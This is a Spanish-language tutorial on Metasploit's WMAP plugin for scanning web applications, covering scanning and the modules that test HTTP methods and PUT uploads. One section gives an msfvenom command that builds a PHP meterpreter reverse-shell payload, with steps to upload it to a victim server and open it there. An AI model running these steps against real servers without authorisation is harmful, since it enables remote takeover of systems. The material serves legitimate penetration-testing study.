# Análisis de Vulnerabilidades Web con WMAP (Metasploit)

## ¿Qué es WMAP?

WMAP es un **plugin de Metasploit Framework** que permite realizar **análisis de vulnerabilidades en aplicaciones web** de forma integrada. Está basado en el motor de Nikto y combina escaneo pasivo y activo sobre objetivos HTTP/HTTPS.

---

## Preparación: Cargar el módulo WMAP

```bash
msfconsole
load wmap
```

Esto carga el plugin de WMAP en la consola.

---

## Paso 1: Crear el entorno de trabajo

1. **Añadir el sitio al workspace**
```bash
wmap_sites -a <IP>
```

2. **Establecer el objetivo**
```bash
wmap_targets -t http://<IP>
```

3. **Verificar los sitios añadidos**
```bash
wmap_sites -l
```

---

## Paso 2: Ejecutar el escaneo

```bash
wmap_run -t
```

Esto ejecutará todos los módulos asociados al target (si están disponibles) y comenzará el escaneo de vulnerabilidades web.

> El `-t` indica que se ejecute contra el objetivo especificado.

---

## Uso de módulos auxiliares HTTP

### 1. **Ver métodos HTTP habilitados**

```bash
use auxiliary/scanner/http/options
set RHOSTS <IP>
set RPORT 80
run
```

Este módulo intenta descubrir métodos habilitados en el servidor (GET, POST, PUT, DELETE, etc.). Si PUT o DELETE están habilitados, puede ser crítico.

---

### 2. **Intentar carga de archivos con HTTP PUT**

```bash
use auxiliary/scanner/http/http_put
set RHOSTS <IP>
set RPORT 80
set PATH /upload/test.txt
run
```

- **PATH** es la ruta donde intentará subir el archivo.
- Si el resultado es **“upload successful”**, quiere decir que el servidor permite subir archivos arbitrarios, lo cual es un riesgo de seguridad.

---

### ¿Qué pasa si el HTTP PUT funciona?

Si el servidor permite subir archivos, puedes:
- Subir un archivo PHP, ASPX o JS malicioso.
- Obtener ejecución remota si la carpeta subida es accesible vía web.
- Usar Metasploit para generar payloads con `msfvenom` y subirlos.

Ejemplo:

```bash
msfvenom -p php/meterpreter/reverse_tcp LHOST=<tu_IP> LPORT=4444 -f raw > shell.php
```

Luego subirlo con el módulo `http_put` y acceder vía navegador:
```
http://<victima>/upload/shell.php
```

---

## Casos de uso de WMAP

- Escaneo de vulnerabilidades web automatizado.
- Verificación de métodos HTTP inseguros.
- Detección de directorios ocultos y configuraciones erróneas.
- Identificación de formularios y posibles vectores XSS/SQLi.

---

## Resumen de comandos WMAP

```bash
load wmap                       # Cargar el plugin
wmap_sites -a <IP>              # Añadir un nuevo sitio
wmap_targets -t http://<IP>     # Definir objetivo HTTP
wmap_sites -l                   # Ver los sitios añadidos
wmap_run -t                     # Ejecutar escaneo completo
```

---
